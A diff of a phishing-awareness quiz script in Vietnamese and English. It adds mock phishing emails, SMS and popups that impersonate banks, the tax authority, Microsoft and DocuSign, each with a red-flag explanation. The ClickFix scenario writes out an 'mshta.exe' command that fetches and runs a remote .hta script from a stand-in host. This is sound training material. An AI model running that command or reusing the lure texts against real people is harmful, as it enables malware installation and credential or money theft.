@@ -1,105 +1,20 @@
 # -*- coding: utf-8 -*-
+"""
+Script thêm 20 kịch bản phishing mới vào database hiện có.
+Chạy: python add_questions.py
+"""
+import sys
+import os
+sys.stdout.reconfigure(encoding="utf-8")
+
+# Đảm bảo import đúng app context
+sys.path.insert(0, os.path.dirname(__file__))
+
+from app import app
 from models import db, Question
 
-
-SAMPLE_QUESTIONS = [
-    {
-        "title": "Email giả mạo ngân hàng VCB",
-        "scenario_type": "email",
-        "content": """<div class="email-mockup">
-  <div class="email-header">
-    <div class="email-field"><span class="label">Từ:</span> <span class="value">security@vietcombank-alert.com</span></div>
-    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
-    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">⚠️ Tài khoản của bạn bị tạm khóa - Xác minh ngay!</span></div>
-  </div>
-  <div class="email-body">
-    <p>Kính gửi Quý khách hàng,</p>
-    <p>Chúng tôi phát hiện hoạt động <strong>đáng ngờ</strong> trên tài khoản của bạn. Để bảo vệ tài sản, tài khoản đã bị <span style="color:red;font-weight:bold">TẠM KHÓA</span>.</p>
-    <p>Vui lòng xác minh danh tính trong <strong>24 giờ</strong> để tránh mất quyền truy cập vĩnh viễn:</p>
-    <a href="#" onclick="return false;" style="background:#003087;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;display:inline-block;margin:10px 0">Xác minh tài khoản ngay</a>
-    <p style="color:#888;font-size:12px">Vietcombank © 2024 | support@vcb.com.vn</p>
-  </div>
-</div>""",
-        "is_phishing": True,
-        "explanation": "Đây là email PHISHING. Dấu hiệu nhận biết: (1) Địa chỉ email người gửi là 'vietcombank-alert.com' thay vì 'vietcombank.com.vn' chính thức. (2) Tạo cảm giác khẩn cấp với '24 giờ'. (3) Ngân hàng thật không bao giờ yêu cầu xác minh qua email. Hãy gọi hotline chính thức nếu nghi ngờ.",
-    },
-    {
-        "title": "Link rút ngắn đến trang đăng nhập giả",
-        "scenario_type": "link",
-        "content": """<div class="link-scenario">
-  <p>Bạn nhận được tin nhắn Zalo từ một người bạn:</p>
-  <div class="chat-bubble">
-    <p><strong>Nguyễn Văn A:</strong> "Ơi mày xem thử cái này đi, tao vừa trúng thưởng iPhone 15 từ Shopee nè, mày vào link này điền thông tin là nhận được luôn 🎁"</p>
-    <code>https://bit.ly/shopee-giftxyz</code>
-  </div>
-  <p style="margin-top:12px">Link rút gọn dẫn đến: <code>http://shopee-gift.net/dang-nhap</code></p>
-</div>""",
-        "is_phishing": True,
-        "explanation": "Đây là PHISHING. Dấu hiệu: (1) Domain 'shopee-gift.net' không phải shopee.vn chính thức. (2) Dùng link rút gọn để che địa chỉ thật. (3) Mồi nhử 'trúng thưởng' tạo hứng thú giả tạo. (4) Tài khoản bạn bè có thể đã bị chiếm. Không bao giờ đăng nhập qua link từ tin nhắn.",
-    },
-    {
-        "title": "Thông báo cập nhật mật khẩu IT nội bộ",
-        "scenario_type": "email",
-        "content": """<div class="email-mockup">
-  <div class="email-header">
-    <div class="email-field"><span class="label">Từ:</span> <span class="value">it-support@congty.com.vn</span></div>
-    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
-    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Lịch bảo trì hệ thống - Chủ nhật 22/12 từ 23:00-02:00</span></div>
-  </div>
-  <div class="email-body">
-    <p>Xin chào các bạn,</p>
-    <p>Phòng IT thông báo lịch bảo trì hệ thống định kỳ:</p>
-    <ul>
-      <li>Thời gian: Chủ nhật 22/12/2024, 23:00 – 02:00 thứ Hai</li>
-      <li>Hệ thống bị ảnh hưởng: Email nội bộ, VPN, phần mềm chấm công</li>
-      <li>Vui lòng lưu tài liệu đang làm việc trước 22:30</li>
-    </ul>
-    <p>Mọi thắc mắc liên hệ: <a href="mailto:it-support@congty.com.vn">it-support@congty.com.vn</a> hoặc máy nhánh 1234.</p>
-    <p>Trân trọng,<br>Phòng IT</p>
-  </div>
-</div>""",
-        "is_phishing": False,
-        "explanation": "Đây là email HỢP LỆ từ phòng IT nội bộ. Dấu hiệu bình thường: (1) Domain email trùng với tên công ty. (2) Không yêu cầu click link hoặc nhập thông tin. (3) Cung cấp kênh liên hệ nội bộ rõ ràng (email + máy nhánh). (4) Nội dung thông báo hành chính bình thường.",
-    },
-    {
-        "title": "Popup cảnh báo virus giả",
-        "scenario_type": "text",
-        "content": """<div class="popup-mockup" style="border:3px solid red;background:#fff3f3;padding:20px;max-width:450px;margin:auto;border-radius:8px;font-family:Arial">
-  <div style="text-align:center;color:red;font-size:24px;margin-bottom:10px">⚠️ CẢNH BÁO BẢO MẬT</div>
-  <p style="font-weight:bold">Máy tính của bạn bị nhiễm <span style="color:red">5 virus nguy hiểm!</span></p>
-  <p>Windows đã phát hiện các mối đe dọa nghiêm trọng. Phần mềm độc hại đang đánh cắp thông tin ngân hàng của bạn.</p>
-  <p><strong>Gọi ngay đường dây hỗ trợ Microsoft:</strong></p>
-  <div style="font-size:22px;font-weight:bold;text-align:center;color:#0078d4;margin:10px 0">1800-xxx-xxxx</div>
-  <button onclick="return false;" style="width:100%;background:red;color:white;padding:12px;border:none;font-size:16px;cursor:pointer;border-radius:4px">Quét virus ngay - MIỄN PHÍ</button>
-</div>""",
-        "is_phishing": True,
-        "explanation": "Đây là PHISHING kiểu 'scareware'. Chiến thuật: (1) Tạo ra nỗi sợ bằng cảnh báo virus giả. (2) Số điện thoại giả mạo Microsoft — Microsoft không bao giờ hiển thị popup yêu cầu gọi điện. (3) Nếu gọi, kẻ tấn công sẽ lừa cài phần mềm điều khiển từ xa hoặc thu tiền. Đóng tab/cửa sổ ngay lập tức.",
-    },
-    {
-        "title": "Email xác nhận đặt hàng Tiki hợp lệ",
-        "scenario_type": "email",
-        "content": """<div class="email-mockup">
-  <div class="email-header">
-    <div class="email-field"><span class="label">Từ:</span> <span class="value">no-reply@tiki.vn</span></div>
-    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
-    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Xác nhận đơn hàng #TK20241215-88421</span></div>
-  </div>
-  <div class="email-body">
-    <p>Xin chào, đơn hàng của bạn đã được xác nhận.</p>
-    <table style="border-collapse:collapse;width:100%">
-      <tr style="background:#f5f5f5"><td style="padding:8px"><strong>Sản phẩm</strong></td><td style="padding:8px">Laptop Asus VivoBook 15</td></tr>
-      <tr><td style="padding:8px"><strong>Mã đơn</strong></td><td style="padding:8px">#TK20241215-88421</td></tr>
-      <tr style="background:#f5f5f5"><td style="padding:8px"><strong>Tổng tiền</strong></td><td style="padding:8px">12.990.000đ</td></tr>
-      <tr><td style="padding:8px"><strong>Giao hàng dự kiến</strong></td><td style="padding:8px">17/12/2024</td></tr>
-    </table>
-    <p style="margin-top:12px">Theo dõi đơn hàng tại <a href="#">tiki.vn/order</a> hoặc ứng dụng Tiki.</p>
-    <p style="color:#888;font-size:12px">© 2024 Tiki Corporation. 52 Út Tịch, Phường 4, Q. Tân Bình, TP.HCM</p>
-  </div>
-</div>""",
-        "is_phishing": False,
-        "explanation": "Đây là email HỢP LỆ từ Tiki. Dấu hiệu: (1) Domain 'tiki.vn' chính thức. (2) Nội dung chỉ xác nhận thông tin đơn hàng, không yêu cầu thêm hành động hay nhập thông tin. (3) Có địa chỉ công ty thực tế. (4) Không tạo áp lực khẩn cấp.",
-    },
-    # ── Câu 6–25: kịch bản bổ sung ───────────────────────────────────────────
+NEW_QUESTIONS = [
+    # ── 1 ── File đính kèm độc hại (VI) ─────────────────────────────────────
     {
         "title": "Email hoá đơn có file đính kèm độc hại",
         "scenario_type": "email",
@@ -126,6 +41,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là email PHISHING phát tán mã độc qua file đính kèm giả. Dấu hiệu: (1) Tên file 'HoaDon_T12_2024.pdf.exe' — phần mở rộng thật là .exe (chương trình thực thi), không phải PDF. (2) Domain người gửi không quen thuộc, không phải nhà cung cấp nội bộ đã xác nhận. (3) Không bao giờ mở file .exe, .bat, .vbs, .js nhận từ email — đây là vector phát tán ransomware phổ biến nhất. Báo cáo ngay cho bộ phận IT.",
     },
+
+    # ── 2 ── ClickFix / mshta.exe LOTL (EN) ─────────────────────────────────
     {
         "title": "Fake CAPTCHA instructing mshta.exe (ClickFix)",
         "scenario_type": "text",
@@ -144,7 +61,7 @@ SAMPLE_QUESTIONS = [
     <ol style="font-size:13px;color:#444;padding-left:18px;line-height:2">
       <li>Press <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">Win</kbd> + <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">R</kbd></li>
       <li>Paste the command below into the Run dialog</li>
-      <li>Press <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">Enter</kbd> to apply the update</li>
+      <li>Press <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">Enter</kbd></li>
     </ol>
     <div style="background:#1e1e1e;color:#d4d4d4;padding:10px 14px;border-radius:4px;font-family:monospace;font-size:13px;word-break:break-all;margin-bottom:10px">
       mshta.exe https://verify-captcha-cdn.net/v.hta
@@ -157,6 +74,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "This is a ClickFix PHISHING attack using Living-off-the-Land (LOTL) technique. Red flags: (1) Legitimate CAPTCHAs never ask you to run commands manually — real reCAPTCHA works entirely in the browser. (2) mshta.exe is a built-in Windows utility abused here to download and run a remote .hta script from an attacker-controlled server. (3) This bypasses antivirus because it uses a signed Windows binary. (4) Executing the command installs malware silently. Never run commands from a webpage — close the tab immediately and report to IT.",
     },
+
+    # ── 3 ── CEO Fraud / BEC (VI) ────────────────────────────────────────────
     {
         "title": "CEO Fraud — yêu cầu chuyển tiền khẩn cấp",
         "scenario_type": "email",
@@ -181,6 +100,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là tấn công BEC (Business Email Compromise) — giả mạo CEO. Dấu hiệu: (1) Email CEO thật dùng domain công ty, không phải @gmail.com. (2) Yêu cầu 'bảo mật tuyệt đối, không báo ai' — nhằm cô lập nạn nhân và ngăn xác minh. (3) Áp lực thời gian gấp (trước 15:00). (4) Mọi giao dịch tài chính lớn đều cần quy trình phê duyệt nội bộ. Luôn xác minh qua gọi điện trực tiếp cho CEO trước khi thực hiện bất kỳ chuyển khoản nào.",
     },
+
+    # ── 4 ── Fake Microsoft 365 Login Page (EN) ──────────────────────────────
     {
         "title": "Fake Microsoft 365 login portal",
         "scenario_type": "text",
@@ -196,6 +117,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "This is a PHISHING page mimicking Microsoft 365 login. Red flags: (1) The URL is 'microsoft-365-login.auth-verify.com' — legitimate Microsoft login is 'login.microsoftonline.com'. (2) The site uses a lookalike domain to steal credentials. (3) Any credentials entered are sent directly to attackers. Always check the address bar before entering passwords. Use a password manager — it will not autofill on fake sites.",
     },
+
+    # ── 5 ── Smishing / SMS OTP (VI) ─────────────────────────────────────────
     {
         "title": "SMS giả mạo ngân hàng BIDV yêu cầu OTP",
         "scenario_type": "text",
@@ -216,6 +139,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là tấn công Smishing (SMS Phishing) giả mạo BIDV. Dấu hiệu: (1) BIDV liên lạc chính thức qua số ngắn đã đăng ký (1800 1xx), không phải tên hiển thị tuỳ ý. (2) Domain 'bidv-xacminh.net' là giả — BIDV dùng 'bidv.com.vn'. (3) Link dẫn đến trang thu thập OTP và thông tin thẻ. (4) Ngân hàng thật không gửi link chặn truy cập qua SMS. Gọi trực tiếp hotline BIDV 1900 9247 nếu nghi ngờ.",
     },
+
+    # ── 6 ── Fake SharePoint file share (EN) ─────────────────────────────────
     {
         "title": "Fake SharePoint document share notification",
         "scenario_type": "email",
@@ -227,7 +152,7 @@ SAMPLE_QUESTIONS = [
   </div>
   <div class="email-body">
     <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
-      <span style="font-size:18px">📁</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg/240px-Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg.png" alt="SharePoint" style="height:20px;pointer-events:none">
       <span style="font-size:13px;color:#666">Microsoft SharePoint</span>
     </div>
     <p><strong>Michael Chen</strong> shared a file with you.</p>
@@ -245,6 +170,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "This is a PHISHING email impersonating Microsoft SharePoint. Red flags: (1) The sender domain is 'sharepoint-docshare.net' — legitimate SharePoint notifications come from '@microsoft.com' or your company's own SharePoint domain. (2) Clicking 'Open in SharePoint' redirects to a fake login page to steal Microsoft 365 credentials. (3) Be suspicious of unexpected file shares, even from known names — the sender may be spoofed. Verify with the sender directly via Teams or phone.",
     },
+
+    # ── 7 ── QR Code Phishing / Quishing (VI) ────────────────────────────────
     {
         "title": "Email QR code giả mạo cổng HR nội bộ",
         "scenario_type": "email",
@@ -269,6 +196,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là tấn công Quishing (QR Code Phishing). Dấu hiệu: (1) Domain 'hrsystem-portal.net' không phải hệ thống HR chính thức của công ty. (2) QR code dẫn đến trang giả mạo — tấn công này dùng QR để vượt qua bộ lọc link trong email. (3) Yêu cầu 'chỉ dùng di động' nhằm tránh kiểm tra URL trên máy tính. (4) Hệ thống HR thật không yêu cầu quét QR qua email bất ngờ. Gõ trực tiếp địa chỉ hệ thống HR vào trình duyệt thay vì quét QR.",
     },
+
+    # ── 8 ── Fake HR salary update (VI) ──────────────────────────────────────
     {
         "title": "Email giả HR yêu cầu cập nhật thông tin lương",
         "scenario_type": "email",
@@ -290,6 +219,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là email PHISHING giả mạo phòng Nhân sự. Dấu hiệu: (1) Domain 'nhan-su-portal.com' không phải domain công ty. (2) Yêu cầu cung cấp số CCCD và thông tin ngân hàng qua link ngoài — HR thật dùng hệ thống nội bộ đã xác thực. (3) Đe dọa trì hoãn lương để tạo áp lực. Kiểm tra với phòng HR qua email nội bộ hoặc gặp trực tiếp trước khi cung cấp bất kỳ thông tin cá nhân nào.",
     },
+
+    # ── 9 ── Fake DocuSign (EN) ───────────────────────────────────────────────
     {
         "title": "Fake DocuSign signature request",
         "scenario_type": "email",
@@ -315,6 +246,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "This is a PHISHING email impersonating DocuSign. Red flags: (1) Sender domain is 'docusign-secure-document.com' — legitimate DocuSign uses '@docusign.com' or '@docusign.net'. (2) 'REVIEW DOCUMENT' leads to a fake login page to steal your Microsoft or Google credentials. (3) Always go directly to docusign.com and check your inbox there instead of clicking email links. Contact HR directly to verify if a real contract amendment was sent.",
     },
+
+    # ── 10 ── ClickFix PowerShell / fake browser update (EN) ─────────────────
     {
         "title": "Fake browser update prompting PowerShell command",
         "scenario_type": "text",
@@ -339,6 +272,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "This is a ClickFix PHISHING attack using PowerShell as a Living-off-the-Land technique. Red flags: (1) Chrome and all browsers update silently through their own built-in updater — they never ask you to run PowerShell commands. (2) The command uses '-ep bypass' to disable PowerShell's execution policy safety check, then downloads and runs an attacker-controlled script. (3) This technique is used to deploy infostealers (RedLine, Lumma) and remote access trojans. Close the page immediately and report to IT.",
     },
+
+    # ── 11 ── Legitimate HR holiday notice (VI) — LEGITIMATE ─────────────────
     {
         "title": "Thông báo lịch nghỉ Tết Nguyên Đán 2025",
         "scenario_type": "email",
@@ -364,6 +299,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": False,
         "explanation": "Đây là email HỢP LỆ từ phòng Nhân sự. Dấu hiệu bình thường: (1) Gửi từ domain chính thức của công ty '@congty.com.vn'. (2) Gửi đến danh sách nội bộ 'all-staff', không nhắm riêng một cá nhân. (3) Nội dung là thông báo hành chính bình thường, không có link bên ngoài hay yêu cầu nhập thông tin. (4) Cung cấp số nhánh điện thoại nội bộ và địa chỉ email để liên hệ.",
     },
+
+    # ── 12 ── Fake IT VPN password reset (VI) ────────────────────────────────
     {
         "title": "Email giả IT yêu cầu đặt lại mật khẩu VPN",
         "scenario_type": "email",
@@ -389,6 +326,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là email PHISHING giả mạo IT HelpDesk. Dấu hiệu: (1) Domain 'congty-support.net' là giả — IT nội bộ dùng domain công ty chính thức. (2) Số nhánh '9999' bất thường — kiểm tra lại số IT thật trong danh bạ nội bộ. (3) Nhấn 'Gia hạn VPN' dẫn đến trang giả thu thập thông tin đăng nhập mạng công ty. (4) IT thật thường gia hạn tài khoản qua hệ thống nội bộ, không cần nhân viên tự làm qua link email.",
     },
+
+    # ── 13 ── Fake GHN delivery SMS (VI) ─────────────────────────────────────
     {
         "title": "SMS giả mạo GHN thông báo giao hàng thất bại",
         "scenario_type": "text",
@@ -408,6 +347,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là Smishing giả mạo GHN. Dấu hiệu: (1) GHN liên hệ qua số chính thức 1900 636 888 và app GHN, không phải tên hiển thị tuỳ ý. (2) Domain 'ghn-xacnhan.delivery-vn.net' không phải 'ghn.vn' chính thức. (3) Phí lưu kho tạo áp lực tài chính buộc click nhanh. (4) Link dẫn đến trang giả yêu cầu thông tin cá nhân hoặc thanh toán thẻ. Tra cứu đơn hàng trực tiếp trên app GHN hoặc website ghn.vn.",
     },
+
+    # ── 14 ── Legitimate GitHub security alert (EN) — LEGITIMATE ──────────────
     {
         "title": "Legitimate GitHub security vulnerability alert",
         "scenario_type": "email",
@@ -432,6 +373,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": False,
         "explanation": "This is a LEGITIMATE security alert from GitHub. Normal indicators: (1) Sent from the official '@github.com' domain. (2) Does not contain a clickable link in the email body — instructs you to visit github.com directly. (3) References a specific real CVE and a specific repository you own. (4) GitHub Dependabot alerts follow this exact format. Always verify by logging into github.com independently.",
     },
+
+    # ── 15 ── Fake Tổng cục Thuế tax authority (VI) ──────────────────────────
     {
         "title": "Email giả mạo Tổng cục Thuế yêu cầu truy thu",
         "scenario_type": "email",
@@ -458,6 +401,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là email PHISHING giả mạo Tổng cục Thuế. Dấu hiệu: (1) Cơ quan nhà nước dùng domain '.gov.vn' — địa chỉ 'tong-cuc-thue-gov.com' là giả mạo. (2) Tổng cục Thuế liên hệ qua bưu điện hoặc cổng 'thuedientu.gdt.gov.vn', không phải email cá nhân. (3) Số tiền cụ thể cùng thời hạn 7 ngày tạo áp lực tâm lý. (4) Nút 'Nộp thuế' dẫn đến trang thu thập thông tin ngân hàng. Tra cứu tại thuedientu.gdt.gov.vn hoặc liên hệ cục thuế địa phương.",
     },
+
+    # ── 16 ── Malicious macro Excel attachment (EN) ───────────────────────────
     {
         "title": "Malicious macro-enabled Excel attachment (Q4 report)",
         "scenario_type": "email",
@@ -486,6 +431,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "This is a PHISHING email delivering a macro-based malware payload. Red flags: (1) The sender is not your company's internal analytics team — the domain 'business-reports-online.com' is external and unrecognized. (2) The .xlsm extension indicates a macro-enabled Excel file, which can execute arbitrary code. (3) The instruction to 'Enable Content' is the attacker's key step — macros are disabled by default exactly because they are abused this way. (4) Legitimate internal reports do not arrive unsolicited from unknown external senders. Never enable macros on unexpected files.",
     },
+
+    # ── 17 ── Fake Microsoft Teams notification (EN) ──────────────────────────
     {
         "title": "Fake Microsoft Teams missed messages notification",
         "scenario_type": "email",
@@ -513,6 +460,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "This is a PHISHING email impersonating Microsoft Teams notifications. Red flags: (1) Sender domain is 'ms-teams-alerts.com' — legitimate Teams emails come from '@microsoft.com'. (2) The fake message from 'IT Support' about account suspension is a classic urgency tactic. (3) Clicking 'Open Teams Messages' leads to a fake Microsoft login page to steal credentials. (4) Real Teams notification emails link to 'teams.microsoft.com'. Always open Teams directly via the app or by typing teams.microsoft.com.",
     },
+
+    # ── 18 ── Crypto pig butchering scam (VI) ────────────────────────────────
     {
         "title": "Tin nhắn lừa đảo đầu tư crypto (pig butchering)",
         "scenario_type": "text",
@@ -536,6 +485,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là lừa đảo 'Pig Butchering' (thả thính đầu tư tiền điện tử). Cơ chế: (1) Tiếp cận qua tin nhắn 'nhầm số' để tạo quen biết giả tạo. (2) Xây dựng lòng tin bằng câu chuyện thành công và mối quan hệ gia đình. (3) Cho rút tiền nhỏ ban đầu để tạo niềm tin, sau đó khoá tài khoản khi nạn nhân nạp số tiền lớn. (4) Domain '.vip' không phải nền tảng tài chính hợp lệ. Không đầu tư vào bất kỳ nền tảng nào được giới thiệu qua mạng xã hội bởi người lạ.",
     },
+
+    # ── 19 ── Fake Norton antivirus popup (VI) ────────────────────────────────
     {
         "title": "Popup giả mạo Norton diệt virus hết hạn",
         "scenario_type": "text",
@@ -558,6 +509,8 @@ SAMPLE_QUESTIONS = [
         "is_phishing": True,
         "explanation": "Đây là PHISHING kiểu Scareware giả mạo Norton. Dấu hiệu: (1) Norton và mọi phần mềm diệt virus thật thông báo qua ứng dụng cài sẵn, không phải popup trình duyệt. (2) Danh sách virus cụ thể (3 Trojan, 7 Spyware) là giả tạo để gây hoảng loạn. (3) Nhấn 'Gia hạn' dẫn đến trang thanh toán giả để đánh cắp thông tin thẻ tín dụng. (4) Nút 'Bỏ qua (không được khuyến nghị)' là kỹ thuật thao túng tâm lý. Đóng tab và kiểm tra ứng dụng Norton thật trên máy tính.",
     },
+
+    # ── 20 ── Spear phishing job offer with attachment (EN) ───────────────────
     {
         "title": "Spear phishing job offer with malicious PDF attachment",
         "scenario_type": "email",
@@ -583,21 +536,30 @@ SAMPLE_QUESTIONS = [
   </div>
 </div>""",
         "is_phishing": True,
-        "explanation": "This is a Spear Phishing email targeting finance professionals with a fake job offer. Red flags: (1) The recruiter domain 'financialcareers-apac.com' is not a verified, established recruitment firm — check on LinkedIn before responding. (2) The attached PDF likely exploits Adobe Reader vulnerabilities or uses JavaScript to steal credentials or drop malware when opened. (3) Unrealistically high salary with urgency ('48 hours') is a classic lure for high-value targets. (4) Legitimate recruiters at reputable firms use verified company domains. Never open unsolicited job offer attachments without verification.",
+        "explanation": "This is a Spear Phishing email targeting finance professionals with a fake job offer. Red flags: (1) The recruiter domain 'financialcareers-apac.com' is not a verified, established recruitment firm — check on LinkedIn before responding. (2) The attached PDF likely exploits Adobe Reader vulnerabilities or uses JavaScript to steal credentials / drop malware when opened. (3) Unrealistically high salary with urgency ('48 hours') is a classic lure for high-value targets. (4) Legitimate recruiters at reputable firms use verified company domains. Never open unsolicited job offer attachments without verification.",
     },
 ]
 
 
-def init_db(app):
-    db.init_app(app)
-    with app.app_context():
-        db.create_all()
-        if Question.query.count() == 0:
-            seed_questions()
+def add_new_questions():
+    added = 0
+    skipped = 0
+    existing_titles = {q.title for q in Question.query.all()}
 
-
-def seed_questions():
-    for q in SAMPLE_QUESTIONS:
-        question = Question(**q)
+    for q_data in NEW_QUESTIONS:
+        if q_data["title"] in existing_titles:
+            print(f"  [skip] {q_data['title']}")
+            skipped += 1
+            continue
+        question = Question(**q_data)
         db.session.add(question)
+        print(f"  [add]  {q_data['title']}")
+        added += 1
+
     db.session.commit()
+    print(f"\nDone. Added: {added}, Skipped (duplicate): {skipped}")
+
+
+if __name__ == "__main__":
+    with app.app_context():
+        add_new_questions()
